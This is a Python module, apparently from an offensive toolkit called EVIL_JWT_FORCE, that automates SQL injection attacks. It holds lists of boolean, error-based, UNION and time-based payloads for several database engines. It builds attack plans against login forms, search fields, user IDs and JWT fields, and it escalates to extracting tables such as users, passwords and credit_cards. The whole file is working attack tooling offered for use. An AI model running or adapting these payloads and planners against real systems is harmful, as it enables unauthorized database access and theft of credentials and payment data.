"""
EVIL_JWT_FORCE - SQL Injector AI Module
This module decides where, when, and how to inject SQL payloads based on 
analysis of the target responses and behavior.
"""

import os
import json
import logging
import re
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.FileHandler(os.path.join('logs', 'sql_injector_ai.log')),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('SQL_INJECTOR_AI')

class SQLInjectorAI:
    """
    AI-driven SQL Injection analysis and payload generation.
    
    This class analyzes responses to determine if and how SQL injection may be possible,
    and generates targeted payloads based on response behavior.
    """
    
    def __init__(self, config_path: str = 'config/sql_injector_config.json'):
        """
        Initialize the SQL Injector AI with configuration settings.
        
        Args:
            config_path: Path to the configuration file
        """
        self.config = self._load_config(config_path)
        self.error_patterns = self.config.get('error_patterns', {})
        self.injection_patterns = self.config.get('injection_patterns', {})
        self.blind_payloads = self.config.get('blind_payloads', [])
        self.error_payloads = self.config.get('error_payloads', [])
        self.union_payloads = self.config.get('union_payloads', [])
        self.time_payloads = self.config.get('time_payloads', [])
        self.response_history = []
        self.successful_payloads = {}
        
        logger.info("SQL Injector AI initialized with %d error patterns and %d injection patterns", 
                   len(self.error_patterns), len(self.injection_patterns))
    
    def _load_config(self, config_path: str) -> Dict[str, Any]:
        """Load configuration from JSON file or use defaults if file not found."""
        default_config = {
            'error_patterns': {
                'mysql': [
                    "You have an error in your SQL syntax",
                    "MySQL server version for the right syntax",
                    "MySQL syntax error",
                    "Warning: mysql_",
                    "Warning: mysqli_",
                    "Unclosed quotation mark after the character string"
                ],
                'postgresql': [
                    "PostgreSQL syntax error",
                    "PG::SyntaxError",
                    "ERROR: syntax error at or near",
                    "ERROR: unterminated quoted string at or near"
                ],
                'oracle': [
                    "ORA-00933: SQL command not properly ended",
                    "ORA-01756: quoted string not properly terminated",
                    "ORA-01722: invalid number",
                    "ORA-00942: table or view does not exist",
                    "ORA-"
                ],
                'sqlserver': [
                    "Microsoft SQL Server",
                    "Unclosed quotation mark after the character string",
                    "Incorrect syntax near",
                    "Line [0-9]+: Incorrect syntax near"
                ],
                'sqlite': [
                    "SQLite3::SQLException",
                    "SQLite error",
                    "near \".*\": syntax error"
                ]
            },
            'injection_patterns': {
                'jwt_payload': [
                    'sub',
                    'name',
                    'email',
                    'username',
                    'id',
                    'user_id',
                    'role',
                    'permissions',
                    'data'
                ],
                'jwt_header': [
                    'kid',
                    'jku',
                    'x5u'
                ]
            },
            'blind_payloads': [
                "' OR '1'='1",
                "' OR 1=1 -- ",
                "' OR 1=1;--",
                "') OR ('1'='1",
                "') OR ('1'='1'--",
                "' OR '1'='1' #",
                "' OR 1=1 LIMIT 1;--"
            ],
            'error_payloads': [
                "'",
                "\"",
                "'\"",
                "\\",
                "';",
                "\";",
                "\\';",
                "\\\";"
            ],
            'union_payloads': [
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- ",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- ",
                "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ",
                "') UNION SELECT 1,2,3,4,5,6,7,8,9,10-- "
            ],
            'time_payloads': [
                "' OR (SELECT SLEEP(5))-- ",
                "' OR (SELECT pg_sleep(5))-- ",
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)-- ",
                "' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5)=0-- "
            ],
            'default_injection_fields': [
                'username',
                'password',
                'email',
                'id',
                'name',
                'search',
                'query',
                'q',
                'keyword',
                'key',
                'token',
                'user',
                'uid'
            ],
            'success_indicators': [
                'admin',
                'password',
                'root',
                'shell',
                'SELECT',
                'FROM',
                'WHERE',
                'database',
                'table',
                'column'
            ],
            'sensitive_tables': [
                'users',
                'admins',
                'customers',
                'accounts',
                'passwords',
                'members',
                'user_data',
                'admin_users',
                'login',
                'auth',
                'cards',
                'credit_cards',
                'payments'
            ]
        }
        
        try:
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    return json.load(f)
            else:
                logger.warning("Config file not found at %s. Using default configuration.", config_path)
                # Create default config
                os.makedirs(os.path.dirname(config_path), exist_ok=True)
                with open(config_path, 'w') as f:
                    json.dump(default_config, f, indent=2)
                return default_config
        except Exception as e:
            logger.error("Error loading configuration: %s. Using default configuration.", str(e))
            return default_config
    
    def analyze_response(self, response: Dict[str, Any], injected_payload: Optional[str] = None) -> Dict[str, Any]:
        """
        Analyze a response for SQL injection indicators.
        
        Args:
            response: The HTTP response to analyze
            injected_payload: The payload that was injected (if any)
            
        Returns:
            Dictionary with analysis results
        """
        logger.info("Analyzing response for SQL injection indicators")
        
        # Initialize analysis results
        analysis = {
            'url': response.get('url', ''),
            'status_code': response.get('status_code', 0),
            'response_time': response.get('response_time', 0),
            'sql_error_detected': False,
            'error_type': None,
            'error_details': None,
            'success_indicators': [],
            'is_vulnerable': False,
            'vulnerability_type': None,
            'confidence': 0.0,
            'suggested_payloads': [],
            'injected_payload': injected_payload,
            'timestamp': datetime.now().isoformat()
        }
        
        # Extract response body
        response_body = response.get('body', '')
        if not response_body:
            logger.warning("Empty response body")
            return analysis
        
        # Check for SQL error patterns
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    analysis['sql_error_detected'] = True
                    analysis['error_type'] = db_type
                    analysis['error_details'] = pattern
                    analysis['is_vulnerable'] = True
                    analysis['vulnerability_type'] = 'error_based'
                    analysis['confidence'] = 0.9
                    logger.info("SQL error detected: %s (%s)", pattern, db_type)
                    break
            if analysis['sql_error_detected']:
                break
        
        # Check for success indicators
        for indicator in self.config.get('success_indicators', []):
            if re.search(r'\b' + re.escape(indicator) + r'\b', response_body, re.IGNORECASE):
                analysis['success_indicators'].append(indicator)
        
        # If success indicators found but no error detected, might be blind SQL injection
        if analysis['success_indicators'] and not analysis['sql_error_detected'] and injected_payload:
            analysis['is_vulnerable'] = True
            analysis['vulnerability_type'] = 'blind_based'
            analysis['confidence'] = 0.7
            logger.info("Potential blind SQL injection detected")
        
        # Check for time-based indicators (if response time is suspiciously long)
        if response.get('response_time', 0) > 5.0 and injected_payload and any(keyword in injected_payload for keyword in ['SLEEP', 'pg_sleep', 'BENCHMARK', 'DBMS_PIPE']):
            analysis['is_vulnerable'] = True
            analysis['vulnerability_type'] = 'time_based'
            analysis['confidence'] = 0.8
            logger.info("Potential time-based SQL injection detected (response time: %.2f seconds)", response.get('response_time', 0))
        
        # Generate suggested payloads based on analysis
        if analysis['is_vulnerable']:
            analysis['suggested_payloads'] = self._suggest_payloads(analysis)
        
        # Store the response in history
        self._add_to_history(response, analysis, injected_payload)
        
        return analysis
    
    def _suggest_payloads(self, analysis: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Suggest payloads based on the vulnerability analysis."""
        suggested_payloads = []
        
        if analysis['vulnerability_type'] == 'error_based':
            # For error-based, suggest more targeted error payloads
            payloads = self.error_payloads + self.union_payloads
            confidence = 0.9
            
            # If we know the DB type, suggest more specific payloads
            if analysis['error_type'] == 'mysql':
                payloads.extend([
                    "' OR 1=1 -- ",
                    "' UNION SELECT VERSION(),2,3,4,5-- ",
                    "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=DATABASE()-- "
                ])
            elif analysis['error_type'] == 'postgresql':
                payloads.extend([
                    "' OR 1=1 -- ",
                    "' UNION SELECT version(),2,3,4,5-- ",
                    "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables-- "
                ])
            elif analysis['error_type'] == 'oracle':
                payloads.extend([
                    "' OR 1=1 -- ",
                    "' UNION SELECT banner,2,3,4,5 FROM v$version-- ",
                    "' UNION SELECT table_name,2,3,4,5 FROM all_tables-- "
                ])
            elif analysis['error_type'] == 'sqlserver':
                payloads.extend([
                    "' OR 1=1 -- ",
                    "' UNION SELECT @@version,2,3,4,5-- ",
                    "' UNION SELECT name,2,3,4,5 FROM sysobjects WHERE xtype='U'-- "
                ])
            
        elif analysis['vulnerability_type'] == 'blind_based':
            # For blind-based, suggest boolean-based payloads
            payloads = self.blind_payloads
            confidence = 0.7
        
        elif analysis['vulnerability_type'] == 'time_based':
            # For time-based, suggest time-based payloads
            payloads = self.time_payloads
            confidence = 0.8
        
        else:
            # Default to a mix of payloads
            payloads = self.error_payloads[:2] + self.blind_payloads[:2] + self.time_payloads[:1]
            confidence = 0.5
        
        # Convert to suggested payload format
        for payload in payloads:
            suggested_payloads.append({
                'payload': payload,
                'type': analysis['vulnerability_type'] or 'generic',
                'confidence': confidence,
                'purpose': 'Exploiting ' + (analysis['vulnerability_type'] or 'potential') + ' SQL injection'
            })
        
        return suggested_payloads
    
    def _add_to_history(self, response: Dict[str, Any], analysis: Dict[str, Any], 
                      injected_payload: Optional[str] = None) -> None:
        """Add a response to the history for learning."""
        history_entry = {
            'url': response.get('url', ''),
            'status_code': response.get('status_code', 0),
            'response_time': response.get('response_time', 0),
            'is_vulnerable': analysis['is_vulnerable'],
            'vulnerability_type': analysis['vulnerability_type'],
            'injected_payload': injected_payload,
            'timestamp': datetime.now().isoformat()
        }
        
        self.response_history.append(history_entry)
        
        # Limit history size
        if len(self.response_history) > 100:
            self.response_history = self.response_history[-100:]
        
        # If this was a successful injection, store it
        if analysis['is_vulnerable'] and injected_payload:
            payload_type = analysis['vulnerability_type'] or 'unknown'
            
            if payload_type not in self.successful_payloads:
                self.successful_payloads[payload_type] = []
            
            self.successful_payloads[payload_type].append({
                'payload': injected_payload,
                'url': response.get('url', ''),
                'timestamp': datetime.now().isoformat()
            })
    
    def analyze_jwt_for_sqli(self, token: Dict[str, Any]) -> Dict[str, Any]:
        """
        Analyze a JWT token for potential SQL injection points.
        
        Args:
            token: The decoded JWT token (header and payload)
            
        Returns:
            Dictionary with analysis results
        """
        logger.info("Analyzing JWT for SQL injection points")
        
        analysis = {
            'header_injection_points': [],
            'payload_injection_points': [],
            'suggested_payloads': [],
            'priority_fields': [],
            'confidence': 0.0
        }
        
        # Check header for injectable fields
        header = token.get('header', {})
        for field in self.injection_patterns.get('jwt_header', []):
            if field in header:
                analysis['header_injection_points'].append({
                    'field': field,
                    'value': header[field],
                    'confidence': 0.7
                })
        
        # Check payload for injectable fields
        payload = token.get('payload', {})
        for field in self.injection_patterns.get('jwt_payload', []):
            if field in payload:
                # Check if the field value appears to be a string or numeric identifier
                value = payload[field]
                if isinstance(value, str):
                    confidence = 0.6
                    # If it looks like an ID, username, or other common injectable field, increase confidence
                    if field in ['id', 'user_id', 'uid'] or re.match(r'^\d+$', value):
                        confidence = 0.8
                    
                    analysis['payload_injection_points'].append({
                        'field': field,
                        'value': value,
                        'confidence': confidence
                    })
        
        # Prioritize injection points
        all_points = analysis['header_injection_points'] + analysis['payload_injection_points']
        all_points.sort(key=lambda x: x['confidence'], reverse=True)
        
        # Set priority fields
        analysis['priority_fields'] = [point['field'] for point in all_points[:3]]
        
        # Generate suggested payloads for each priority field
        for field in analysis['priority_fields']:
            for payload_type in ['error', 'blind', 'union', 'time']:
                payloads = []
                if payload_type == 'error':
                    payloads = self.error_payloads[:3]
                elif payload_type == 'blind':
                    payloads = self.blind_payloads[:3]
                elif payload_type == 'union':
                    payloads = self.union_payloads[:2]
                elif payload_type == 'time':
                    payloads = self.time_payloads[:2]
                
                for payload in payloads:
                    analysis['suggested_payloads'].append({
                        'field': field,
                        'payload': payload,
                        'type': payload_type,
                        'location': 'header' if field in [p['field'] for p in analysis['header_injection_points']] else 'payload'
                    })
        
        # Set overall confidence based on the number and quality of injection points
        if all_points:
            analysis['confidence'] = max(point['confidence'] for point in all_points)
        
        return analysis
    
    def generate_attack_plan(self, target_info: Dict[str, Any], jwt_token: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Generate a SQL injection attack plan based on target info and optional JWT token.
        
        Args:
            target_info: Information about the target
            jwt_token: Optional decoded JWT token
            
        Returns:
            Attack plan with prioritized strategies and payloads
        """
        logger.info("Generating SQL injection attack plan")
        
        plan = {
            'target_url': target_info.get('url', ''),
            'attack_vectors': [],
            'jwt_vectors': [],
            'priority_payloads': [],
            'fallback_payloads': [],
            'parameter_targets': [],
            'is_jwt_injectable': False,
            'timestamp': datetime.now().isoformat()
        }
        
        # Define attack vectors based on target info
        if target_info.get('has_login_form', False):
            plan['attack_vectors'].append({
                'type': 'login_form',
                'priority': 1,
                'fields': ['username', 'password'],
                'payloads': self.blind_payloads[:3]
            })
        
        if target_info.get('has_search', False):
            plan['attack_vectors'].append({
                'type': 'search',
                'priority': 2,
                'fields': ['q', 'query', 'search', 'keyword'],
                'payloads': self.error_payloads[:2] + self.union_payloads[:2]
            })
        
        if target_info.get('has_user_profile', False):
            plan['attack_vectors'].append({
                'type': 'user_profile',
                'priority': 3,
                'fields': ['id', 'user_id', 'uid', 'profile'],
                'payloads': self.error_payloads[:2] + self.blind_payloads[:2]
            })
        
        # If we have a JWT token, analyze it for SQL injection points
        if jwt_token:
            jwt_analysis = self.analyze_jwt_for_sqli(jwt_token)
            
            if jwt_analysis['priority_fields']:
                plan['is_jwt_injectable'] = True
                plan['jwt_vectors'] = jwt_analysis['suggested_payloads']
                
                # Add JWT as an attack vector
                plan['attack_vectors'].insert(0, {
                    'type': 'jwt',
                    'priority': 0,  # Highest priority
                    'fields': jwt_analysis['priority_fields'],
                    'payloads': [p['payload'] for p in jwt_analysis['suggested_payloads'][:5]]
                })
        
        # Extract and combine priority payloads from all vectors
        all_payloads = []
        for vector in plan['attack_vectors']:
            all_payloads.extend([(p, vector['priority']) for p in vector['payloads']])
        
        # Sort by priority
        all_payloads.sort(key=lambda x: x[1])
        
        # Set priority and fallback payloads
        plan['priority_payloads'] = [p[0] for p in all_payloads[:5]]
        plan['fallback_payloads'] = [p[0] for p in all_payloads[5:10]]
        
        # Set parameter targets from injection patterns and target info
        potential_parameters = self.config.get('default_injection_fields', [])
        plan['parameter_targets'] = potential_parameters
        
        return plan
    
    def refine_strategy(self, response_analysis: Dict[str, Any], 
                      current_plan: Dict[str, Any]) -> Dict[str, Any]:
        """
        Refine the attack strategy based on response analysis.
        
        Args:
            response_analysis: Analysis of the latest response
            current_plan: The current attack plan
            
        Returns:
            Updated attack plan
        """
        logger.info("Refining SQL injection strategy based on response analysis")
        
        updated_plan = current_plan.copy()
        
        # If we detected a vulnerability, focus on that type
        if response_analysis['is_vulnerable']:
            vuln_type = response_analysis['vulnerability_type']
            logger.info("Detected %s SQL injection vulnerability - refining strategy", vuln_type)
            
            # Update attack vectors to focus on the detected vulnerability type
            for vector in updated_plan['attack_vectors']:
                if vuln_type == 'error_based':
                    vector['payloads'] = self.error_payloads[:3] + self.union_payloads[:3]
                elif vuln_type == 'blind_based':
                    vector['payloads'] = self.blind_payloads
                elif vuln_type == 'time_based':
                    vector['payloads'] = self.time_payloads
            
            # Update priority payloads
            if vuln_type == 'error_based':
                updated_plan['priority_payloads'] = self.error_payloads[:2] + self.union_payloads[:3]
            elif vuln_type == 'blind_based':
                updated_plan['priority_payloads'] = self.blind_payloads
            elif vuln_type == 'time_based':
                updated_plan['priority_payloads'] = self.time_payloads
            
            # Add the successful payload to the priority list if it's not already there
            injected_payload = response_analysis.get('injected_payload')
            if injected_payload and injected_payload not in updated_plan['priority_payloads']:
                updated_plan['priority_payloads'].insert(0, injected_payload)
            
            # Add database-specific payloads if we detected the DB type
            if response_analysis.get('error_type'):
                db_type = response_analysis['error_type']
                if db_type == 'mysql':
                    updated_plan['priority_payloads'].extend([
                        "' UNION SELECT TABLE_NAME,2,3 FROM information_schema.tables WHERE table_schema=DATABASE()-- ",
                        "' UNION SELECT COLUMN_NAME,2,3 FROM information_schema.columns WHERE table_name='users'-- "
                    ])
                elif db_type == 'postgresql':
                    updated_plan['priority_payloads'].extend([
                        "' UNION SELECT table_name,2,3 FROM information_schema.tables-- ",
                        "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- "
                    ])
                elif db_type == 'oracle':
                    updated_plan['priority_payloads'].extend([
                        "' UNION SELECT table_name,2,3 FROM all_tables-- ",
                        "' UNION SELECT column_name,2,3 FROM all_tab_columns WHERE table_name='USERS'-- "
                    ])
                elif db_type == 'sqlserver':
                    updated_plan['priority_payloads'].extend([
                        "' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U'-- ",
                        "' UNION SELECT name,2,3 FROM syscolumns WHERE id=OBJECT_ID('users')-- "
                    ])
            
            # Add targeted data extraction payloads
            for table in self.config.get('sensitive_tables', []):
                updated_plan['priority_payloads'].append(
                    f"' UNION SELECT 1,2,3 FROM {table}-- "
                )
        
        # If this is a JWT-based attack, update the JWT vectors too
        if updated_plan.get('is_jwt_injectable', False) and updated_plan.get('jwt_vectors'):
            if response_analysis['is_vulnerable']:
                vuln_type = response_analysis['vulnerability_type']
                
                # Filter and prioritize JWT vectors based on the vulnerability type
                if vuln_type == 'error_based':
                    updated_plan['jwt_vectors'] = [v for v in updated_plan['jwt_vectors'] 
                                               if v['type'] in ['error', 'union']]
                elif vuln_type == 'blind_based':
                    updated_plan['jwt_vectors'] = [v for v in updated_plan['jwt_vectors'] 
                                               if v['type'] == 'blind']
                elif vuln_type == 'time_based':
                    updated_plan['jwt_vectors'] = [v for v in updated_plan['jwt_vectors'] 
                                               if v['type'] == 'time']
        
        return updated_plan


if __name__ == "__main__":
    # Example usage
    injector = SQLInjectorAI()
    
    # Example JWT token (decoded)
    jwt_token = {
        'header': {
            'alg': 'HS256',
            'typ': 'JWT',
            'kid': '12345'
        },
        'payload': {
            'sub': '1234567890',
            'name': 'John Doe',
            'id': '42',
            'admin': False,
            'iat': 1516239022
        }
    }
    
    # Analyze JWT for SQL injection points
    jwt_analysis = injector.analyze_jwt_for_sqli(jwt_token)
    print("JWT Analysis:", json.dumps(jwt_analysis, indent=2))
    
    # Generate attack plan
    target_info = {
        'url': 'https://example.com/api',
        'has_login_form': True,
        'has_search': True,
        'has_user_profile': True
    }
    
    plan = injector.generate_attack_plan(target_info, jwt_token)
    print("Attack Plan:", json.dumps(plan, indent=2))
    
    # Example response to analyze
    response = {
        'url': 'https://example.com/api/users',
        'status_code': 500,
        'headers': {
            'Content-Type': 'application/json'
        },
        'body': 'Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...',
        'response_time': 0.5
    }
    
    # Analyze response
    response_analysis = injector.analyze_response(response, "' OR 1=1 -- ")
    print("Response Analysis:", json.dumps(response_analysis, indent=2))
    
    # Refine strategy
    updated_plan = injector.refine_strategy(response_analysis, plan)
    print("Updated Plan:", json.dumps(updated_plan, indent=2)) 